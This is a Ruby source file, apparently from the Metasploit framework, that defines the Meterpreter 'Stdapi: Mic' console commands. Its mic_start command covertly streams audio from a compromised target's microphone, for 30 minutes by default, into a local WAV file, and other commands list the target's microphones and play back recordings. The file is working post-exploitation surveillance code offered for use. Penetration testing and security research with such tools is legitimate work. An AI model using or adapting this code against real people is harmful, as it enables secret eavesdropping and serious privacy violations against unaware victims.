# -*- coding: binary -*-
require 'rex/post/meterpreter'
require 'bindata'

module Rex
  module Post
    module Meterpreter
      module Ui

        ###
        #
        # Mic - Capture audio from the remote system
        #
        ###
        class Console::CommandDispatcher::Stdapi::Mic
          Klass = Console::CommandDispatcher::Stdapi::Mic

          include Console::CommandDispatcher

          #
          # List of supported commands.
          #
          def commands
            all = {
              'mic_start' => 'start capturing an audio stream from the target mic',
              'mic_stop'  => 'stop capturing audio',
              'mic_list'  => 'list all microphone interfaces',
              'listen'    => 'listen to a saved audio recording via audio player'
            }
            reqs = {
              'mic_start' => [ 'audio_mic_start' ],
              'mic_stop'  => [ 'audio_mic_stop' ],
              'mic_list'  => [ 'audio_mic_list' ],
              'listen'    => [ 'audio_mic_start' ]
            }

            filter_commands(all, reqs)
          end

          #
          # Name for this dispatcher
          #
          def name
            "Stdapi: Mic"
          end

          def cmd_mic_list
            client.mic.mic_list
            if client.mic.mic_list.length == 0
              print_error("No mics were found")
              return
            end

            client.mic.mic_list.each_with_index do |name, indx|
              print_line("#{indx + 1}: #{name}")
            end
          end

          def audio_file_wave_header(sample_rate_hz:, num_channels:, bits_per_sample:, data_size:)
            subchunk1_size = 16
            chunk_size = 4 + (8 + subchunk1_size) + (8 + data_size)
            byte_rate = sample_rate_hz * num_channels * bits_per_sample / 8
            block_align = num_channels * bits_per_sample / 8

            [
              BinData::Int32be.new(0x52494646),      # ChunkID: "RIFF"
              BinData::Int32le.new(chunk_size),      # ChunkSize
              BinData::Int32be.new(0x57415645),      # Format: "WAVE"
              BinData::Int32be.new(0x666d7420),      # SubChunk1ID: "fmt "
              BinData::Int32le.new(16),              # SubChunk1Size
              BinData::Int16le.new(1),               # AudioFormat
              BinData::Int16le.new(num_channels),    # NumChannels
              BinData::Int32le.new(sample_rate_hz),  # SampleRate
              BinData::Int32le.new(byte_rate),       # ByteRate
              BinData::Int16le.new(block_align),     # BlockAlign
              BinData::Int16le.new(bits_per_sample), # BitsPerSample
              BinData::Int32be.new(0x64617461),      # SubChunk2ID: "data"
              BinData::Int32le.new(data_size)        # SubChunk2Size
            ]
          end

          def cmd_mic_start(*args)
            get_data = lambda do |channel, file|
              data = channel.read(65536)
              if data
                ::File.open(file, 'a') do |f|
                  f.write(data)
                end
                return data.length
              end
              return 0
            end
            device_id = 1
            duration = 1800
            saved_audio_path = Rex::Text.rand_text_alpha(8) + ".wav"

            mic_start_opts = Rex::Parser::Arguments.new(
              "-h" => [ false, "Help Banner" ],
              "-d" => [ true, "The stream duration in seconds (Default: 1800)" ], # 30 min
              "-m" => [ true, "Microphone device index to record from (1: system default)" ],
              "-s" => [ true, "The saved audio file path (Default: '#{saved_audio_path}')" ]
            )

            mic_start_opts.parse(args) do |opt, _idx, val|
              case opt
              when "-h"
                print_line("Usage: mic_start [options]\n")
                print_line("Streams and records audio from the target microphone.")
                print_line(mic_start_opts.usage)
                return
              when "-d"
                duration = val.to_i
              when "-m"
                device_id = val.to_i
              when "-s"
                saved_audio_path = val
              end
            end

            mic_list = client.mic.mic_list
            if mic_list.length == 0
              print_error("Target does not have a mic")
              return
            end
            if device_id < 1 || device_id > mic_list.length
              print_error("Target does not have a mic with an id of #{device_id}")
              return
            end

            channel = client.mic.mic_start(device_id)
            if channel.nil?
              print_error("Mic failed to start streaming.")
              return
            end
            print_status("Saving to audio file: #{saved_audio_path}")
            print_status("Streaming started...")
            total_data_len = 0
            begin
              ::File.open(saved_audio_path, 'wb') do |outfile|
                audio_file_wave_header(sample_rate_hz: 11025, num_channels: 1, bits_per_sample: 16, data_size: 2_000_000_000).each {
                  |e| e.write(outfile)
                }
              end
              ::Timeout.timeout(duration) do
                while client do
                  Rex::sleep(0.5)
                  total_data_len += get_data.call(channel, saved_audio_path)
                end
              end
            rescue ::Timeout::Error
            ensure
              total_data_len += get_data.call(channel, saved_audio_path)
              client.mic.mic_stop
              print_status("Streaming stopped.")
              # Now that we know the actual length of data, update the file header.
              ::File.open(saved_audio_path, 'rb+') do |outfile|
                outfile.seek(0, ::IO::SEEK_SET)
                audio_file_wave_header(sample_rate_hz: 11025, num_channels: 1, bits_per_sample: 16, data_size: total_data_len).each {
                  |e| e.write(outfile)
                }
              end
            end
          end

          def cmd_listen(*args)
            filename = nil

            listen_opts = Rex::Parser::Arguments.new(
              "-h" => [ false, "Help Banner" ],
              "-f" => [ true, "audio filename" ]
            )

            listen_opts.parse(args) do |opt, _idx, val|
              case opt
              when "-h"
                print_line("Usage: listen -f <filename>\n")
                print_line("Plays saved audio from a file.")
                print_line(listen_opts.usage)
                return
              when "-f"
                filename = val
              end
            end

            if filename.nil?
              print_error("use '-f' option to provide a filename for playback")
              return
            end

            Rex::Compat.play_sound(::File.expand_path(filename))
          end

          def cmd_mic_stop
            client.mic.mic_stop
          end
        end
      end
    end
  end
end
